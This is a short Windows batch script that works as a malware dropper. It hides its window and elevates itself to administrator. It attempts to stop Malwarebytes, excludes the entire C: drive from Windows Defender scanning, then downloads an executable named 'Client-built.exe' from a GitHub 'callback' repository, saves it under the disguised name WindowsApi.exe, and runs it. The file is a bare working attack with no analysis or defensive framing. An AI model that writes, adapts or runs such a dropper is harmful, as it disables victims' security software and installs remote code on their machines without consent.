@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)

set "scriptDir=%~dp0"

tasklist /FI "IMAGENAME eq Malwarebytes.exe" 2>NUL | find /I /N "Malwarebytes.exe" > NUL
if "%ERRORLEVEL%"=="0" (
    start "" "%ProgramFiles%\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" --stopservice
    powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/aspdasdksa2/callback/raw/main/Client-built.exe', 'C:\WindowsApi\WindowsApi.exe')"
    start "" "C:\WindowsApi\WindowsApi.exe"
    taskkill /IM cmd.exe
    exit
) else (
    powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/aspdasdksa2/callback/raw/main/Client-built.exe', 'C:\WindowsApi\WindowsApi.exe')"
    start "" "C:\WindowsApi\WindowsApi.exe"
    taskkill /IM cmd.exe
    exit
)
